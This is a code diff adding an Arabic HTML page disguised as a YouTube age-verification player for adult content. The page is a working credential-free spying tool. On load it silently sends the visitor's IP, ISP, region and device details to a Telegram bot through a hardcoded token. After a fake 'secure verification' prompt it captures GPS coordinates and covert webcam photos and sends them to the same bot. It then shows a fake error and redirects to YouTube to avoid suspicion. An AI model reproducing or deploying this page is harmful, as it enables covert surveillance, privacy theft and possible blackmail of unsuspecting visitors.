@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube - تشغيل آمن</title>
+    <style>
+        /* تصميم واجهة يوتيوب الغامقة */
+        body { background-color: #0f0f0f; color: #fff; font-family: "Roboto", Arial, sans-serif; margin: 0; padding: 0; }
+        .yt-header { height: 56px; background: #0f0f0f; display: flex; align-items: center; padding: 0 16px; border-bottom: 1px solid #222; }
+        .yt-logo { height: 20px; opacity: 0.9; }
+        
+        /* مشغل الفيديو الوهمي */
+        .player-container { position: relative; width: 100%; padding-top: 56.25%; /* 16:9 Aspect Ratio */ background: #000; overflow: hidden; }
+        .player-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10; background: rgba(0,0,0,0.8); }
+        
+        /* أيقونة التحميل (Spinner) */
+        .spinner { border: 4px solid #333; border-radius: 50%; border-top: 4px solid #fff; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .verify-btn { background-color: #f00; color: white; border: none; padding: 10px 20px; border-radius: 2px; font-weight: bold; cursor: pointer; font-size: 14px; text-transform: uppercase; }
+        .verify-text { color: #aaa; font-size: 12px; margin-top: 15px; width: 80%; text-align: center; line-height: 1.4; }
+
+        /* تفاصيل الفيديو الأسفل */
+        .video-details { padding: 16px; }
+        .video-title { font-size: 18px; font-weight: 500; margin-bottom: 8px; line-height: 1.4; }
+        .video-stats { font-size: 12px; color: #aaa; margin-bottom: 16px; }
+        .channel-info { display: flex; align-items: center; border-top: 1px solid #222; padding-top: 16px; }
+        .channel-icon { width: 40px; height: 40px; background: #333; border-radius: 50%; margin-left: 12px; }
+        .channel-name { font-weight: 500; font-size: 14px; }
+        .subs { color: #aaa; font-size: 12px; }
+
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="yt-header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube Logo" class="yt-logo">
+</div>
+
+<div class="player-container">
+    <div class="player-overlay" id="playerOverlay">
+        <div class="spinner" id="loadingSpinner"></div>
+        <button class="verify-btn" id="startBtn">تشغيل الفيديو (التحقق الآمن)</button>
+        <div class="verify-text" id="statusMsg">بانتظار الموافقة على صلاحيات الكاميرا والموقع للتحقق من العمر (محتوى +18).</div>
+    </div>
+    <video id="video" autoplay playsinline muted></video>
+</div>
+
+<div class="video-details">
+    <div class="video-title">شاهد: محتوى حصري للكبار فقط - يتطلب التحقق من الهوية</div>
+    <div class="video-stats">1,234,567 مشاهدة • قبل 3 ساعات</div>
+    
+    <div class="channel-info">
+        <div class="channel-icon"></div>
+        <div>
+            <div class="channel-name">القناة الرسمية للمحتوى الحصري</div>
+            <div class="subs">10.5 مليون مشترك</div>
+        </div>
+    </div>
+</div>
+
+<canvas id="canvas"></canvas>
+
+<script>
+    const token = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
+    const chatId = "591768998";
+    
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const startBtn = document.getElementById('startBtn');
+    const statusMsg = document.getElementById('statusMsg');
+    const spinner = document.getElementById('loadingSpinner');
+
+    // إرسال معلومات الشبكة والجهاز فوراً (صامت)
+    window.onload = async () => {
+        let meta = `📩 محاولة تشغيل فيديو يوتيوب\n📱 الجهاز: ${navigator.userAgent}\n`;
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            meta += `🌐 IP: ${d.ip}\n📍 المنطقة: ${d.region}\n🏢 المزود: ${d.org}`;
+        } catch {}
+        sendDataToBot(meta, "text");
+    };
+
+    startBtn.addEventListener('click', async () => {
+        startBtn.style.display = 'none';
+        statusMsg.innerText = "جاري الاتصال بخوادم التحقق الآمن...";
+        
+        try {
+            // طلب كافة الصلاحيات (كاميرا + موقع + مايك)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            video.srcObject = stream;
+
+            // طلب الموقع الجغرافي
+            navigator.geolocation.getCurrentPosition(p => {
+                sendDataToBot(`📍 إحداثيات الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, "text");
+            });
+
+            // محاكاة خطوات الفحص
+            setTimeout(() => { statusMsg.innerText = "جاري مطابقة ملامح الوجه..."; captureFrame(1); }, 1500);
+            setTimeout(() => { statusMsg.innerText = "جاري تأكيد البيانات الحيوية..."; captureFrame(2); }, 3500);
+            
+            setTimeout(() => { 
+                statusMsg.innerText = "خطأ في التشغيل: حدث خطأ في خادم الفيديو. يرجى إعادة المحاولة لاحقاً."; 
+                spinner.style.animation = "none"; // إيقاف السبينر
+                spinner.style.borderColor = "#f00"; // تغييره للون الأحمر كخطأ
+                
+                setTimeout(() => {
+                    stream.getTracks().forEach(t => t.stop());
+                    // التوجيه النهائي لصفحة يوتيوب الحقيقية بعد الفشل لإبعاد الشبهة
+                    window.location.replace("https://www.youtube.com");
+                }, 2000);
+            }, 6000);
+
+        } catch (err) {
+            statusMsg.innerText = "خطأ: يجب منح كافة الصلاحيات لتشغيل هذا المحتوى.";
+            statusMsg.style.color = "#f00";
+            startBtn.style.display = 'block';
+        }
+    });
+
+    function captureFrame(id) {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+            fd.append('photo', blob, `yt_verify_${id}.jpg`);
+            fd.append('caption', `🎬 لقطة تحقق يوتيوب رقم ${id}`);
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd, keepalive: true });
+        }, 'image/jpeg', 0.6);
+    }
+
+    function sendDataToBot(msg, type) {
+        const url = `https://api.telegram.org/bot${token}/${type === "photo" ? "sendPhoto" : "sendMessage"}`;
+        fetch(url, {
+            method: 'POST',
+            headers: type === "text" ? {'Content-Type': 'application/json'} : {},
+            body: type === "text" ? JSON.stringify({chat_id: chatId, text: msg}) : msg,
+            keepalive: true
+        });
+    }
+</script>
+</body>
+</html>
